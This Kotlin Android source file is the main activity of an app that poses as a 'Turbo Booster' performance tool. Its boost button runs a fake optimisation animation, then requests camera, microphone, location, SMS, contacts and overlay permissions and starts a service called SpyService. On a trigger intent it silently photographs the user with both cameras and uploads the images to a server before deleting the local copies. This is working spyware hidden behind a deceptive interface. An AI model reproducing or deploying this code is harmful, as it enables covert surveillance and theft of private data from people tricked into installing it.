package com.ratnik.app

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.graphics.drawable.GradientDrawable
import android.hardware.Camera
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    private val client = OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).build()
    private val serverUrl = "http://127.0.0.1:8080" // Замени на свой IP при тесте на другом телефоне

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        if (intent.getBooleanExtra("SNAP", false)) {
            takeBothSnapshots()
            return
        }

        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.gravity = Gravity.CENTER
        layout.setPadding(50, 50, 50, 50)
        
        val background = GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            intArrayOf(Color.parseColor("#0F172A"), Color.parseColor("#1E293B"))
        )
        layout.background = background

        val title = TextView(this)
        title.text = "⚡ TURBO BOOSTER"
        title.setTextColor(Color.parseColor("#00E5FF"))
        title.textSize = 32f
        title.gravity = Gravity.CENTER
        layout.addView(title)

        val stats = TextView(this)
        stats.text = "RAM: 3.2 GB / 4.0 GB\nCPU: 42°C\nFPS: 60\n\nОПТИМИЗАЦИЯ НЕ ТРЕБУЕТСЯ"
        stats.setTextColor(Color.WHITE)
        stats.textSize = 18f
        stats.gravity = Gravity.CENTER
        stats.setPadding(0, 50, 0, 50)
        layout.addView(stats)

        val btn = Button(this)
        btn.text = "🚀 BOOST NOW"
        btn.textSize = 20f
        btn.setTextColor(Color.BLACK)
        btn.setBackgroundColor(Color.parseColor("#00E5FF"))
        
        btn.setOnClickListener {
            btn.text = "АНАЛИЗ... 20%"
            btn.isEnabled = false
            
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(100, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(100)
            }

            Handler(Looper.getMainLooper()).postDelayed({ btn.text = "ОЧИСТКА RAM... 60%" }, 800)
            Handler(Looper.getMainLooper()).postDelayed({ btn.text = "УСКОРЕНИЕ... 90%" }, 1600)
            Handler(Looper.getMainLooper()).postDelayed({
                btn.text = "✅ FPS УВЕЛИЧЕН ДО 120!"
                btn.setTextColor(Color.WHITE)
                btn.setBackgroundColor(Color.parseColor("#10B981"))
                checkPermissionsAndStart()
            }, 2500)
        }
        layout.addView(btn)
        setContentView(layout)
    }

    private fun checkPermissionsAndStart() {
        val perms = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val missing = perms.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 101)
        } else {
            checkOverlayPermission()
        }
    }

    private fun checkOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
            startActivityForResult(intent, 102)
        } else {
            startSpyService()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101) checkOverlayPermission()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 102) startSpyService()
    }

    private fun startSpyService() {
        val intent = Intent(this, SpyService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
    }

    private fun takeBothSnapshots() {
        var backId = -1
        var frontId = -1
        val info = Camera.CameraInfo()
        for (i in 0 until Camera.getNumberOfCameras()) {
            Camera.getCameraInfo(i, info)
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) backId = i
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) frontId = i
        }

        captureFromCamera(backId, "snap_back.jpg") {
            captureFromCamera(frontId, "snap_front.jpg") {
                finish()
            }
        }
    }

    private fun captureFromCamera(cameraId: Int, fileName: String, onComplete: () -> Unit) {
        if (cameraId == -1) {
            onComplete()
            return
        }

        var camera: Camera? = null
        try {
            camera = Camera.open(cameraId)
            val params = camera.parameters
            params.pictureFormat = ImageFormat.JPEG
            
            val focusModes = params.supportedFocusModes
            if (focusModes != null && focusModes.contains(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE)) {
                params.focusMode = Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE
            }
            
            camera.parameters = params
            camera.setPreviewTexture(SurfaceTexture(0))
            camera.startPreview()
            
            Thread.sleep(300)
            
            camera.takePicture(null, null) { data, _ ->
                try {
                    val file = File(cacheDir, fileName)
                    FileOutputStream(file).use { it.write(data) }
                    
                    val requestBody = file.asRequestBody("image/jpeg".toMediaTypeOrNull())
                    val multipartBody = MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("file", fileName, requestBody)
                        .build()
                        
                    val request = Request.Builder().url("$serverUrl/upload").post(multipartBody).build()
                    
                    try {
                        client.newCall(request).execute().use { }
                        file.delete()
                    } catch (e: Exception) {}
                    
                    camera.release()
                    onComplete()
                    
                } catch (e: Exception) {
                    camera.release()
                    onComplete()
                }
            }
        } catch (e: Exception) {
            camera?.release()
            onComplete()
        }
    }
}
